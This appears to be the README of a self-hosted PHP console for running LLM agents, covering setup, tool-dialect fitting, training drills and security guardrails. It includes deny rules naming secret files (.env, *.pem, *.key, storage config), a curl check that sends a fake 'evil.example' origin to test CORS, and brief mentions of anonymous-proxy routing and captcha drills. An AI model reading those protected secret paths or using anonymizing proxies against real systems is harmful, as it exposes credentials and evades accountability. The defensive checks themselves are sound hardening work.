<!--
  Copyright 2026 M. Bryce Hudson

  Licensed under the Apache License, Version 2.0 — see LICENSE.
  SPDX-License-Identifier: Apache-2.0
-->
# 🧠 Autonomous Loop Studio

### Make any model an agent — even a small one, even the one on your laptop.

**A self-hosted agent console in plain PHP.** No Docker. No Node. No build step. No account.

Point it at a 7B on your laptop or a frontier API. Every request runs the same loop: it tries the
tool dialect that model answers, catches the near miss, retries in the next format, and keeps the
call that actually executed — then leads with that one next time. Training mode is that loop driven
to a clean score: fixed drills from six steps to seventeen, or one you write yourself, matching calls, 0 retries.

One folder of PHP and static files — drop it on the host you already pay for, double-click, and a
team of agents is running.

![Autonomous Loop Studio — a self-hosted AI agent console in plain PHP](screenshots/auto-harness.gif)

*Two runs of the same twelve-step training drill to auto fit the harness. The first run ends with twelve
calls, one successful retry, the error visible in the transcript. The harness has learned from its
successful retry. With training mode back on, the second run is completed without error. The harness has
been successfully custom-fitted, and your model is now an agent.*

![PHP](https://img.shields.io/badge/PHP-8.x-777BB4?logo=php&logoColor=white)
![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)
![No build step](https://img.shields.io/badge/build-none_needed-brightgreen)
![Windows](https://img.shields.io/badge/Windows-double_click_to_run-0078D4?logo=windows&logoColor=white)
![Linux](https://img.shields.io/badge/Linux-one_command-FCC624?logo=linux&logoColor=black)
[![Tests](https://github.com/autonomous-loop-studio/Autonomous/actions/workflows/tests.yml/badge.svg)](https://github.com/autonomous-loop-studio/Autonomous/actions/workflows/tests.yml)

**🚀 [Quick start ↓](#-quick-start) · 🩺 [Why agents fail ↓](#why-local-agents-fail--and-what-this-does-about-it) · 🏋 [The harness ↓](#-auto-forming-harnesses-dialects--training-mode) · ✨ [Features ↓](#-whats-inside) · 🔒 [How the guards work ↓](#-security--guardrails--safe-by-construction-️) · 🧩 [Architecture ↓](#-architecture)**

---

## Run it in five minutes

**Windows** — double-click `start.bat`. First run installs Apache + PHP (no MySQL), creates your
access token, starts the server and opens the app. Later runs just start Apache.

**Linux / macOS** — `./start.sh` — or `./start.sh 8090` for another port.

Paste the token it prints into **Config → Access token**, add one provider key, and you have an
agent. Nothing ships with a key, and a fresh copy **refuses to serve** (`503`) until a token
exists — you cannot forget to set one.

Then add a provider — OpenAI, Anthropic, Google, OpenRouter, Groq, DeepSeek, xAI, Mistral,
Cerebras, Together, Perplexity, NVIDIA NIM, or **Ollama / LM Studio / vLLM** on your own LAN.

## What it is

- 🤖 **Any model, any provider.** It detects each provider's API shape *and* its tool dialect —
  JSON, Claude XML, raw tool-call tags — and remembers which one actually worked for that model.
- 🛠️ **Real tools, not chat.** Read and write files inside a jail, run allowlisted commands
  (argv only — no shell), drive a real Chrome/Edge over DevTools, commit with git, call MCP servers.
- 🕸️ **You can watch it.** A live 3D map of agents, providers and traffic; every hop also written
  out in words in a run trace; routing charts you draw instead of describing.
- 🔐 **Safe by default.** `exec`, `run_code`, the browser and the MCP server are **off** until you
  switch them on. Every write asks first. No accounts, no cloud, no telemetry.

## Why local agents fail — and what this does about it

Six failures every operator hits in the first evening, and the code path that answers each.

| The failure | What happens here |
|---|---|
| **The tool syntax is wrong** | A guessed name is repaired, not dropped — `list_agent` runs `list_agents`, a guessed wrapper parses like the real one, an invented name is still refused. A reply that looks like a call but parses to nothing is **re-taught in the next dialect** (plain → JSON → native → Claude XML) rather than becoming the answer, and the dialect that worked is remembered per provider and model. |
| **It says it wrote the file — it didn't** | Only a **named tool plus a completion verb** counts, and only when no call ran. Then the turn is contradicted in the transcript: *"⚠ No tool call ran this turn, so nothing was changed."* An agent that runs tools and writes no answer says that too, instead of a blank that reads as success. |
| **It loops and burns the budget** | A hard step ceiling and a wall-clock deadline per turn, bounded steering, an acyclic `ask_agent` chain (A→B→A is refused), and duplicate-call suppression. When a ceiling is reached the transcript names it: *"You used all N tool calls on this task."* A runaway hits a wall, not your wallet. |
| **The conversation falls out of the window** | Budgeted against the model's **real** window, then compacted: old tool exchanges keep their head and tail, the newest turns survive, oversized results are cut. A 128k model is not replayed as if it had 6k. |
| **It forgets by the next session** | Private notes plus a deliberately small shared collective, with `adopt` so a shared fact can become its own. Injected as **recollection, not instructions** — the agent reads what it learned instead of being told what to do. |
| **You can't tell whether any of it works** | Fixed **6-, 8-, 9-, 12- and 17-step drills** — Frontier on the desktop, Browser in the built-in browser, the rest in one sandbox folder — or your own steps, worked in order and **retried until every step passes** — never skipped. Each pass writes its own file (`…-p2.txt`), so a fresh pass never starts on the last one's bytes, every pass is still there to inspect, the run report lists each pass with its file, and a two-pass self-test in Config — or `php tools/drill-selftest.php` from a terminal — proves the file mechanics with no model at all. The call that actually executed is what gets remembered as the winning syntax, and the score to chase is a full pass, 0 retries. |

If a model is capable and still useless, it is usually one of those six — and each one has a
code path here rather than a paragraph of advice.

## What it is not

Not a hosted service, not a wrapper around one vendor, not a SaaS with an account page. There is
nothing to sign up for, and the only outbound calls are the provider endpoints you configure
yourself.

## A fleet for $0

That laptop is not obsolete; it just hasn't been given a job. An 8B model and one PHP folder will
run this fleet all day at zero marginal cost — no key, no rate limit, no cap. The hosted free tiers
come second, paced to each host's real ceiling so one exhausted key does not stop the fleet.

- ⏱️ **Paced to each provider's real ceiling** — the pacer knows the host's limit (NVIDIA NIM
  40/min, Groq 30, OpenRouter 20, a default for anything unknown), and `0 = AUTO` uses it. Global,
  per-provider or per-agent, and an agent can lock its own.
- 🔑 **A 429 is not a stall** — a rate-limited key rests for 60 seconds and the next call reaches
  for another; add extra keys and the API pool rotates them after N requests.
- ♾️ **Loops that keep going** — Always-On re-prompts a standing goal on a cadence, with *max
  iterations* and *max minutes* caps, per-agent hold/release and one master kill switch.

Free tiers have daily caps, so pacing smooths bursts rather than making them infinite, and "always
on" means the host stays awake — the tab-hidden worker, or a machine that does not sleep. Against
Ollama, LM Studio or vLLM on your own box there is nothing to pace at all.

---

## A look at it

<p>
<img src="screenshots/mainscreen01.png" width="49%">
<img src="screenshots/routing-three-workfows.png" width="49%">
</p>
<p>
<img src="screenshots/Brain-Lab.png" width="49%">
<img src="screenshots/Browser.png" width="49%">
</p>

*Glass desktop and Classic (the default) · a routing chart · Brain Lab · the built-in browser.*

**[The drill, recorded](screenshots/training-mode.gif)** — a local model running the training drill
against a real folder. The attempt before this one repeated `list_dir`, `grep_code` and `exec`, and
said so in the transcript; asked to try again it ran clean, and these are the closing calls of that
run — each landing once, in order, with its own timing:

<p><a href="screenshots/training-mode-poster.png"><img src="screenshots/training-mode.gif" width="880" alt="A local agent running the training drill — its closing tool calls landing once each, in order, each with its own timing."></a></p>

*Click it for the full-size still.*

**[The whole 30 seconds, unedited ↗](https://github.com/autonomous-loop-studio/Autonomous/releases/download/v447/Training-Mode.mp4)** — the failed first pass, the correction, the `ok`, and the clean run. mp4, 43 MB — it downloads rather than streaming in the browser.

## Downloads

There is no binary to install — a release is the source folder, and "updating" is replacing its files.

| | What it is | Get it |
|---|---|---|
| **v501** — current | Captcha drills (Lev.1/2/3), LAN TTS endpoints, smarter forced-tool-choice memory, and config moved into the sidebar. | [Releases](https://github.com/autonomous-loop-studio/Autonomous/releases) |
| **v496** | Pasted tool envelopes unfold instead of failing, the Hard drill teaches the flat call shape, and a same-error hint (toggleable) names it after three identical refusals. | [Release](https://github.com/autonomous-loop-studio/Autonomous/releases/tag/v496) |
| **v495** | Both clients gate the drill todo plan the same way, through one shared path scrub, so a new pass can't reuse the last pass's file. | [Release](https://github.com/autonomous-loop-studio/Autonomous/releases/tag/v495) |
| **v494** | A todo list that lost its commas no longer stalls Easy step 2: every quoted item is recovered in order instead of returning a schema error. | [Release](https://github.com/autonomous-loop-studio/Autonomous/releases/tag/v494) |
| **v482** | A read-only storage folder is refused at boot with the exact chown line, so it can never look like a hang again. | [Release](https://github.com/autonomous-loop-studio/Autonomous/releases/tag/v482) |
| **v481** | Shell access no longer jails an agent outside the app, so a fresh copy's drill can reach its exec step. | [Release](https://github.com/autonomous-loop-studio/Autonomous/releases/tag/v481) |
| **v480** | Start can no longer hang on its own drill archive, and a stale jail named like the sandbox lands in the sandbox. | [Release](https://github.com/autonomous-loop-studio/Autonomous/releases/tag/v480) |
| **v479** | A stale per-agent file jail is cleared instead of merely tolerated, and the IDE drill's pass files are archived like every other drill's. | [Release](https://github.com/autonomous-loop-studio/Autonomous/releases/tag/v479) |
| **v478** | The floating floor is drawn again in 3D, and a moved file jail stops failing every file tool. | [Release](https://github.com/autonomous-loop-studio/Autonomous/releases/tag/v478) |
| **v477** | The IDE and the agents share one write path and one revision log, an IDE drill proves it, and `drill-run.mjs` runs any drill headlessly against a real model. | [Release](https://github.com/autonomous-loop-studio/Autonomous/releases/tag/v477) |
| **v470** | The drill block and every Continue lead with this pass's file, so a model can't reuse the last pass's path. | [Release](https://github.com/autonomous-loop-studio/Autonomous/releases/tag/v470) |
| **v469** | Every training pass must write its own drill file, so one pass can't overwrite another's evidence. | [Release](https://github.com/autonomous-loop-studio/Autonomous/releases/tag/v469) |
| **v467** | The training report names the file each pass actually wrote, and lists every pass it counts. | [Release](https://github.com/autonomous-loop-studio/Autonomous/releases/tag/v467) |
| **v466** | The Advanced drill fetches the app's own page, so a public site can never fail a correct pass again. | [Release](https://github.com/autonomous-loop-studio/Autonomous/releases/tag/v466) |
| **v463** | A two-pass drill self-test in Config, and the run report names the file every pass wrote. | [Release](https://github.com/autonomous-loop-studio/Autonomous/releases/tag/v463) |

Running an older copy? **Config → Updates → INSTALL UPDATE…** updates in place and keeps `storage/`.
Every release, including the open-testing builds before these two, is listed on
[Releases](https://github.com/autonomous-loop-studio/Autonomous/releases).

## Everything else, below

[Quick start](#-quick-start) · [Is it safe?](#-is-it-safe) · [What's inside](#-whats-inside) ·
[Security & guardrails](#-security--guardrails--safe-by-construction-️) ·
[Tools](#️-tools-agents-can-use) · [Routing chart](#-routing-chart) ·
[MCP](#-mcp--connect-out-to-other-servers-client) · [Tunnels](#-tunnels--take-the-mcp-server-off-lan) ·
[Architecture](#-architecture) · [Tests](#-tests) · [API](#-api-endpoints) ·
[Troubleshooting](#-troubleshooting) · [Downloads](#downloads) · [Recent releases](#-whats-new)

Everything above is the pitch. Everything below is the documentation — long, detailed, and
written for someone who has already decided to run it.

---

## 🧭 Contents

Jump straight to a section — every heading on this page is linkable; these are the ones worth a jump.

**🚀 Start here**

- [🚀 Run it in five minutes](#run-it-in-five-minutes)
- [🧭 What it is — the loop](#what-it-is)
- [🩺 Why local agents fail](#why-local-agents-fail--and-what-this-does-about-it)
- [🚫 What it isn't](#what-it-is-not)
- [💰 A fleet for $0](#a-fleet-for-0)
- [🖼️ A look at it](#a-look-at-it)
- [⬇️ Downloads](#downloads)
- [✨ What's inside](#-whats-inside)
- [🔒 Is it safe?](#-is-it-safe)
- [🖥️ Two interfaces, one switch](#️-two-interfaces-one-switch)
- [🎛️ Config → Desktop](#️-config--desktop--the-machine-room-card)

**🧠 Using the studio**

- [🔀 Routing chart](#-routing-chart)
- [🧠💉😉 Brain Lab](#-brain-lab)
- [🧪 API Lab](#-api-lab)
- [🌐 Built-in browser](#-built-in-browser--you-watch-the-agents-drive)

**🔐 Security & guardrails**

[🔐 overview](#-security--guardrails--safe-by-construction-️) · [🔑 token](#-1-the-front-door-is-locked--a-per-device-access-token) · [🚦 approvals](#-2-approvals--nothing-scary-happens-without-a-nod) · [🧾 allow/deny](#-3-allow--deny-lists--an-argv-level-bouncer) · [🧱 the jail](#-4-the-jail--a-fence-with-no-back-gate) · [🐚 no shell](#-5-no-shell-to-hijack) · [🧬 atomic edits](#-6-edits-are-atomic-or-they-dont-happen) · [🐙 git](#-7-git-runs-on-a-leash) · [🌐 SSRF](#-8-network-egress-is-fenced-ssrf-guardrails) · [🕵️ secrets](#️-9-secrets-never-appear-on-screen) · [🖼️ vision](#️-10-vision-is-safe-by-construction) · [🌐 browser gate](#-11-the-built-in-browser-is-gated-on-every-hop) · [🤝 MCP server](#-12-mcp-server--lending-tools-without-giving-away-the-house) · [🧷 injection](#-13-prompt-injection-posture) · [🚫 defaults](#-14-everything-dangerous-defaults-to-off-) · [🧯 fails closed](#-15-fails-closed-and-tells-the-truth) · [🗄️ storage](#️-16-storage-is-never-web-served--in-every-serving-mode) · [🧪 guard tests](#-17-the-guards-are-proven-not-assumed) · [🌐 no CORS](#-18-closed-by-default-in-the-browser-too) · [🖥️ programs](#️-19-opening-programs--a-name-never-a-command-line) · [🔐 masked reads](#-20-secrets--masked-going-out-restored-coming-back) · [🏠 local-only](#-21-no-token-set--this-machine-only) · [🧾 trace integrity](#-22-the-trace-is-written-by-this-app-alone) · [🧪 suite isolation](#-23-the-test-suite-cannot-touch-the-trace--or-another-files-server)

**✨ Features**

- [🖼️ Images & vision](#️-images--vision)
- [🎙️ Voice & audio](#️-voice--audio)
- [⌨️ Slash commands](#️-slash-commands)
- [♾️ Always-On](#️-always-on--the-loop-that-runs-itself)
- [❝ Global pre-prompt override](#-global-pre-prompt-override--one-instruction-for-the-whole-fleet)
- [🧭 The apps notch](#-the-apps-notch--one-thumb-to-everything)
- [🧠 The context assembler](#-the-context-assembler--native-tool-calling)
- [🛠️ Tools agents can use](#️-tools-agents-can-use)
- [🧭 The provider harness](#-the-provider-harness)
- [🧠 Dynamic tools & the learned dialect](#-dynamic-tools--the-learned-dialect)
- [🏋 Auto Forming Harnesses, Dialects & Training Mode](#-auto-forming-harnesses-dialects--training-mode)
- [⏱️ Throttle / limiter / pacer](#️-throttle--limiter--pacer)
- [🔑 API pool](#-api-pool--rotate-your-keys)
- [🌐 Proxy](#-proxy--route-every-agents-outbound-traffic)
- [📊 Metrics & 🔎 Run trace](#-metrics---run-trace)
- [🕸️ Network & topology](#️-network--topology)
- [🧮 Resource Manager](#-resource-manager--let-the-3d-graph-rest-)
- [💭 Thinking & reasoning](#-thinking--reasoning)
- [🧠 Memory](#-memory)
- [💾 Export & import](#-export--import)
- [🔁 Updates — check, download, verify, install](#-updates--check-download-verify-install)


**🔌 Integrations · 📱 Platform · 📚 Reference**

- [🔌 MCP client](#-mcp--connect-out-to-other-servers-client)
- [🖥️ MCP server](#️-mcp--let-others-connect-in-server)
- [🌐 Tunnels](#-tunnels--take-the-mcp-server-off-lan)
- [🤝 Mesh — share agents between copies](#-mesh--share-agents-between-copies)
- [📱 Android & mobile](#-android--mobile)
- [🧩 Architecture](#-architecture)
- [🧪 Tests](#-tests)
- [📋 Releasing a version](RELEASING.md)
- [🔗 API endpoints](#-api-endpoints)
- [🧯 Troubleshooting](#-troubleshooting)
- [📜 License](#-license)

---

## 🚀 Quick start

### 🪟 Windows — one click
- **`start.bat`** — the one-click launcher. First run installs XAMPP (Apache + PHP only, no MySQL), links this folder into `htdocs\router`, configures Apache, creates the access token, starts it and opens the app. Later runs just start Apache. Use this when several agents run at once: Apache is multi-threaded.
- **`start-php.bat`** — legacy built-in server (single-threaded). Fine for one agent at a time, or on machines where Apache cannot run.
- **`setup-xampp.bat`** — repair / advanced installer, used by `start.bat` automatically. Run it directly to reinstall XAMPP or pick another port (`setup-xampp.bat -Port 8090`).

 🧵**Autonomous' implementation of Apache / PHP is not single-threaded — and that is exactly the point.**
 Apache serves many requests at once (a pool of worker processes and threads), so a
 whole team of agents really does run in parallel. 
 **Autonomous ships the workaround:** one click installs XAMPP
 (Apache + PHP only), points it at a free port, loads the `mod_*` modules the
 app's `.htaccess` needs, links the folder and starts a genuinely concurrent
 server — **zero configuration, no database, nothing to hand-tune**. That is the
 mold this project breaks: a multithreaded local server, deployed in one click.
 (`start-php.bat` remains for the rare machine where Apache cannot run; it is the
 slow single-threaded fallback.)
> *PHP's own built-in server is the opposite: `php -S` is a single process,
> so one streamed model reply holds the only slot for its entire duration while
> every other agent — and the browser's own state polling — queues behind it until
> the fetch dies with `NetworkError`. Windows PHP cannot fork, and the usual
> local Windows PHP setups
> either accept that limit or expect you to install and hand-edit Apache/FPM
> yourself. *

### 🐧 Linux / macOS
```bash
./start.sh          # or ./start.sh 8090 for another port
```

### 🌍 Deploying on a real web host (Apache / nginx / IIS)

The one-folder design means `storage/` (the token, provider keys, every session
and the exec allow/deny lists) lives **inside the app folder**. That folder must
**never** be reachable over HTTP. Everything here is about keeping it that way. 🔒

The same rules also cover `tests/`: dev tooling that never runs at runtime, but
that nobody else needs to read either. The full grid — every path against every
serving mode, dotfiles and case variants included — is in
**Security & guardrails → §16**, and the rules are **tested by making the real
request** (§17). 🧪

- 🟡 **Apache** — `storage/.htaccess` and `tests/.htaccess` ship with the app and
  deny their whole folder (`Require all denied`, with a 2.2 fallback).
  `./setup-token.sh` **re-creates the storage one if a deploy lost it**. Just make
  sure `AllowOverride` lets `.htaccess` apply (the XAMPP installer sets this for
  you). The app root `.htaccess` also refuses `storage`, `logs`, `tmp`, `sessions`
  and `tests` as a path segment **at any depth** — a backup or archived copy of the
  app kept inside the web root brings its own `storage/` and `tests/`, and a copy
  made before `tests/.htaccess` existed would otherwise serve its test files in
  full. That guard is `RedirectMatch 403` (mod_alias), not a `RewriteRule`: a child
  `.htaccess` replaces its parent's per-directory rewrites, so a rewrite never sees
  the nested path, while mod_alias config merges normally.
- 🔴 **nginx** — **ignores `.htaccess` entirely**, so you *must* add the rules
  yourself. Ship the included **`nginx.example.conf`** into your `server{}` block
  (it denies `storage`, `logs`, `tmp`, `sessions` and `tests` as a path segment **at
  any depth** — so a backup or an archived copy of the app kept inside the web root
  cannot expose its own `config.json` — plus dotfiles and loose
  `.json/.log/.ini/.bak/.key/.pem` files), then `nginx -t && systemctl reload nginx`.
  A file whose *name* merely contains one of those words (`ui/js/storage.js`, `ui/js/tests.js`)
  is still served.
- 🔵 **IIS** — add a `web.config` at the app root that blocks the `storage` and
  `tests` segments, e.g.:
  ```xml
  <configuration><system.webServer><security><requestFiltering>
    <hiddenSegments>
      <add segment="storage" /><add segment="logs" /><add segment="tmp" />
      <add segment="sessions" /><add segment="tests" />
    </hiddenSegments>
  </requestFiltering></security></system.webServer></configuration>
  ```
- 🧪 **The PHP built-in server** (`start-php.bat` / `php serve.php`) already
  refuses `/storage`, `/logs`, `/tmp`, `/sessions`, `/tests` and dotfiles with a
  `403` — no config needed.
- ✅ **Verify it, don't assume it.** After any deploy, fetch
  `https://your-host/router/storage/config.json` **and**
  `https://your-host/router/tests/js/run.mjs` in a private window. You must get
  **403 / 404** for both — never JSON or source. If you do, stop and fix the rule
  above before doing anything else. 🚨

### 🔑 First run
The launchers install PHP + the extensions it needs (curl, openssl, mbstring, fileinfo, zip) without touching your own `php.ini`, bundle CA certs so HTTPS verifies, and print an **access token** once. Paste it into **Config → Access token** in the app — it saves on paste (there's no SAVE for that field, on purpose).

On Windows the app opens at `http://localhost:8080/router/` (Apache); on Linux/macOS it opens at `http://127.0.0.1:8080/`. If you miss the token, run `start.bat -Token` to print it again. Nothing ships with keys — add your own providers in the **Providers** tab.

---

## 🔒 Is it safe?

Short answer: it runs on your machine, against your keys, and every dangerous capability is off until you switch it on. The full argument is [Security & guardrails](#-security--guardrails--safe-by-construction-️) below — this is the answer to what people assume before they read it.

| If you assumed | What is actually true |
| --- | --- |
| 💸 “It phones home, or needs an account” | No accounts, no cloud service, no analytics. Plain PHP and static files on your own host; the only outbound calls are the provider endpoints **you** configure. |
| 🔑 “It ships with someone's keys” | Nothing ships with a token or a key, and a fresh copy **refuses to serve** (`503`) until `./setup-token.sh` creates one. |
| 🌍 “Any website can drive it” | Every API route is token-gated, CORS has **no wildcard**, and a copy with no token answers `403` to anything not on this machine. |
| 🐚 “The model gets a shell” | `exec` takes an **argv array** — no `sh -c`, no pipes, no redirects — matched against your allowlist *and* denylist, and it **asks first**. |
| 🗝️ “It can read my secrets” | Every path resolves through the jail, and `storage/`, `.env*`, `*.pem`, `*.key` and dotfiles are refused **even inside** an allowed root. |
| 🌐 “It can reach my network” | `fetch_url` and `http_request` refuse private and cloud-metadata hosts; the built-in browser enforces a block list on **every** navigation. |
| 🟢 “It ships switched on” | `exec`, `run_code`, the browser and the MCP server are **off by default**, auto-approve is off, and a global deny button sits in front of every write. |
| 🧪 “Those guards are just prose” | Each is tested by making the real request — `guards`, `apacheGuards`, `nginxGuards`, `secrets`, `programs`, `tls` — in the suite you can run yourself. |

> ⚖️ **What it is not:** a fence around the operator. Turn everything on, auto-approve writes and point the root at `/`, and you have built a very capable foot-gun. The design makes the safe choice the **default**, not mandatory — and it cannot read your mind. 💙

**🧪 Prove it in one command.** Point this at your own copy — every line asserts a *refusal*, so it fails loudly instead of asking you to believe the table:

```bash
BASE=https://your-host/router        # or http://127.0.0.1:8080
fail=0
code() { curl -s -o /dev/null -w '%{http_code}' "$1"; }
for p in storage/config.json storage/sessions tests/js/run.mjs .git/config; do
  c=$(code "$BASE/$p")
  case $c in
    403|404) echo "refused  $p  -> $c" ;;
    *)       echo "OPEN     $p  -> $c"; fail=1 ;;
  esac
done
# A foreign Origin must get no Access-Control-Allow-Origin back at all.
if curl -s -D - -o /dev/null -H 'Origin: https://evil.example' "$BASE/api/state" \
     | grep -qi '^access-control-allow-origin'; then
  echo "OPEN     cross-origin header returned"; fail=1
else
  echo "refused  cross-origin request"
fi
[ $fail -eq 0 ] && echo "storage, tests, dotfiles and CORS are all closed." \
              || echo "Something above is OPEN — fix it before anything else."
```

It answers `403` (or `404` behind nginx, which refuses rather than denies) for the token store, the sessions folder, the test tree and `.git` — and the API sends no cross-origin header unless you listed that origin in `ROUTER_CORS_ORIGINS`. §16 has the per-route grid and each serving mode's rules.

The API itself is deliberately not pass/fail there, because its status states *which posture you are in*: `401` when a token is set and the request omits it, `403` when the gate is off and you are calling from another machine, `503` on a fresh copy with no token at all, and `200` from this machine while a copy has no token — local-only mode working as documented, not a hole. Set a token and that last case closes.

With the tree in hand, the other one-command proof is the suite: `node tests/run.mjs` ends with *All suites passed.* or a `FAIL` line, and the guards are among the files it runs.

The same checks ship as a script, so CI or an operator never has to paste them: `./tools/check-guards.sh --serve` boots a throwaway copy of this tree and checks itself, `./tools/check-guards.sh https://your-host/router` checks a deployment, and `--token ABC` additionally requires the API to answer `200`. Exit codes are the verdict — `0` every refusal held, `1` something answered, `2` a usage or setup problem.

---
## ✨ What's inside

| | Feature | What it does |
|---|---|---|
| 🤖 | **Any model, any provider** | OpenAI, OpenRouter, NVIDIA NIM, Anthropic, Google, Groq, DeepSeek, xAI, Mistral, Cerebras, Together, Perplexity, Ollama, LM Studio, vLLM… |
| 🧭 | **Auto-fitting harness** | Detects each provider's API shape *and* tool dialect, speaks it correctly, and reads the reply back — a runner's own `output` envelope included |
| 🧠 | **Brain Lab** | Every per-agent setting, locks, memory, files and custom tools in one rail |
| 🧪 | **API Lab** | Paste a curl → get it in 10 languages → actually send it server-side |
| 🔀 | **Routing chart** | Draw workflows: agents, loops, checkpoints, delays, parallel fan-out |
| 🛠️ | **Real tools** | Files, shell, web, a code interpreter, git, editors, MCP — with timeouts that end the process instead of the turn, argv shapes models actually write, and approvals that resume the agent where it left off |
| 📺 | **Show, don't paste** | `show_file` / `show_command` / `show_find` / `show_url` put the answer in the transcript and end the turn — 400k characters shown, none of it re-sent as prompt, and every failed call counted in the header instead of buried |
| 🚀 | **Background commands** | `exec_start` runs a server, watcher or anything that never exits and hands back a handle at once; `exec_poll` reads its output and says whether it is alive, `exec_kill` stops it |
| ⏱️ | **Pacer / limiter** | Per-key rate limiting that knows each provider's free-tier ceiling, and gives a slot back when a call is cancelled or goes out early — a learned 429 reaches callers already queued |
| 📊 | **Metrics + 🔎 trace** | Uptime, requests, tokens, budgets, and a live run timeline |
| 🗣️ | **Conversations, in words** | Every hop keeps its **text** — your prompt, the task a coordinator hands down, an agent-to-agent ask with its answer, the reply, and a question typed in the map's ASK box: a **Comms** tab beside the run trace, a per-agent **Talk / Runs** drawer (All / agent-to-agent) opened from either map, a failed ask that stays visible, and a beam you can hover to read *“A → B: …”*. |
| 📣 | **One name, the whole roster** | `ask_agent` / `tell_agent` take `"ALL"` (or `everyone` / `everybody`, any case): ask each agent in turn with replies labelled by agent, or post one instruction to every mailbox — and an agent really called "All" keeps its name |
| 🧠 | **Memory** | Private + collective long-term memory the agents actually use |
| 🔐 | **Locked down** | Access token, approvals, allow/deny lists, jailed filesystem |
| 🔒 | **Verified calls** | Model and speech calls check the peer certificate *and* the hostname — **Auto** exempts LAN and loopback so local runners keep working, **Always** / **Never** are explicit choices saved as `tls.verify`, and `tls.ca_bundle` can point at a PEM you manage yourself |
| 📌 | **Pinned certificates** | Read the chain a host actually presents, see its SHA-256, and store it in `storage/tls/trusted.pem` — every pin is listed in Config → TLS / Certificates with fingerprint, expiry and pin date, and FORGET drops one |
| ⚠️ | **Expiry warnings** | A pin inside 30 days reads *EXPIRES IN n DAYS* in the list and raises a bell notification naming the host, so a renewed server certificate is re-pinned before it becomes an outage |
| 🧭 | **Per-agent API shape** | Pin one agent's harness — OpenAI-compatible, Anthropic, Google, Ollama — instead of relying on detection |
| 🧠 | **Reasoning, in its own box** | Every shape's thinking — `reasoning_content`, Anthropic `thinking` blocks, Google `thought: true` parts, a runner's `{"type":"reasoning"}` blocks — lands in a collapsible panel on the message, and **Config → Interface** pins it Auto, always open or always collapsed |
| 🧰 | **A sandbox per agent** | Add as many jail roots as you like in Brain Lab and hand a different one to each agent; the global default stays exactly where it was. |
| 🔌 | **MCP client + server** | Connect to other MCP servers, *or* let a friend connect to you |
| 🌐 | **Tunnels** | Expose the MCP server off-LAN over ngrok / Cloudflare from Config → Tunnels — installable from the setup scripts, port-aware, URLs copied from the card — [Tunnels](#-tunnels--take-the-mcp-server-off-lan) |
| 🤝 | **Mesh — share agents** | Lend agents to another copy over the MCP server — friend tokens with read/write scope, installs land inactive and keyless, or run remotely on the sharer's meter — [Mesh](#-mesh--share-agents-between-copies) |
| 🎨 | **Themes** | Dark, Matrix, Cyberpunk |
| 🖼️ | **Vision** | Attach images for vision-capable agents — the bytes never hit the server |
| 🎙️ | **Voice** | 🎤 speech-to-text in, 🔊 spoken replies out, with per-agent pitch |
| ⌨️ | **Slash commands** | `/CODE`, `/ROLE`, `/NAME`, `/ALL`, `/?` — address agents from the composer |
| ⬇️ | **Scroll to latest** | With Auto Scroll off, scrolling up reveals a `∨` button parked above the composer; clicking it jumps to the newest message and follows new output until you scroll up again, and scrolling up with Auto Scroll on pauses the follow instead of yanking the transcript |
| 💬 | **Prompt rail** | One short tick per prompt down the right edge of the chat box, newest at the bottom — hovering names it, clicking jumps straight there and flashes the landing |
| 💾 | **Export / import** | Take a session out, or back up the whole state under a name you choose with one checkbox per section — agents, providers & keys, models, settings, memory, pipelines, conversations, metrics, sessions, shell config, approvals — and restore any of it onto any copy. A section the file lacks is left alone rather than blanked, and a restore keeps this copy's own token |
| 🧠 | **Dynamic tools** | Teaches each model the environment it's really in — and learns the tool dialect that works, strictly per agent |
| 🔑 | **API pool** | Rotate a provider's extra keys after N requests; rest them on a 429 |
| 🌐 | **Built-in browser** | A real Chrome/Edge you and the agents drive — watch, click, type, log in |
| ♾️ | **Always-On loop** | Standing goals, auto re-prompted on a cadence — caps, hold/release, one master kill switch |
| 🏋️ | **Training mode** | A paced tool drill for every active agent — ~50% request rate, **Easy 12, Hard 17, Advanced 8, Frontier 6, Browser 9, IDE 8**, or **Custom** in the popup, each Start in a fresh session, sandbox drills in each agent's own `training/` file, retry-until-pass with todo logging — armed from a dumbbell in the Agents header — Start posts the drill into chat so the whole run stays visible, and **`node drill-run.mjs --mode <drill>`** runs any of them headlessly against a real model, graded by the same code; both clients gate the drill todo plan through one shared path scrub, every object tool unfolds a pasted envelope before it runs, a same-error shape hint (toggleable in the popup) names the flat call after three identical refusals, and an opt-in Real-success only switch stops a think/todo-only run from teaching a dialect |
| 📖 | **Harness & training guide** | Auto-fit, manual pins and the six- to seventeen-step drills in one place — [Auto Forming Harnesses, Dialects & Training Mode](#-auto-forming-harnesses-dialects--training-mode) |
| ❝ | **Global pre-prompt** | One instruction for every agent — **prepend** (default) or **replace**, toggled live |
| 🧠 | **Context assembler** | History & tool output budgeted to each model's *real* window, with live compaction |
| 🧭 | **Apps notch** | One thumb-tab to the Labs, the routing chart and the built-in browser |
| 🧮 | **Resource Manager** | Optional pause / idle throttles + CPU/GPU gauges so the 3D graph can rest |
| 🕸️ | **MCP on the graph** | Outgoing calls and incoming friends drawn as live nodes with editable access |
| 🖥️ | **Two interfaces** | **Classic** (default) and **Desktop 2026** — one switch, same features, same store |
| 🎛️ | **Desktop card** | Fog · bloom · floating floor · floor pin · map detail · frame cap · glass — tuned defaults, every knob exposed |
| 🌐 | **Proxy** | Hundreds of live HTTP proxies — **elite** and **anonymous** only — with ping, uptime and favourites; one click routes outbound traffic through it — every endpoint on your own network goes direct |
| 🔄 | **Self-updates, one click** | A load-time check that names what shipped, asked again within the hour and offered on every load until installed, a verified download that shows the diff, and an installer that keeps a rollback copy first — your settings are never in scope |
| 🖥️ | **Agent-opened programs** | An agent may **name** a program on your list and it opens **detached**, so the window outlives the reply — closed gracefully, always by the binary and never by name, and audited as *started* |
| ⌨️ | **Typing into programs** | `window_type` brings an open window forward and types into it live — 2000 characters per call, special keys literal, newlines as ENTER, and a send that fails loudly if the window never came forward. It reads the window back through Windows UI Automation and says whether the text actually landed. It finds Windows 11's packaged Notepad, waits for a slow starter, and keeps its own Ask / Allow / Deny switch |
| 🕵️ | **Masked reads** | The config routes answer `********` instead of your access token, keys and friend tokens — and the write path restores the real value |
| 🏠 | **Local-only mode** | Until a token is set, only requests from this machine are answered — anything else gets **403** — and a reverse proxy is judged by the client it forwards, not by its own loopback address |
| 📱 | **Mobile-first** | Built for the phone in your pocket: the composer rides above the open keyboard, URL-bar wiggles are ignored, and an **Allow** choice finally sticks |

---
## 🔀 Routing chart

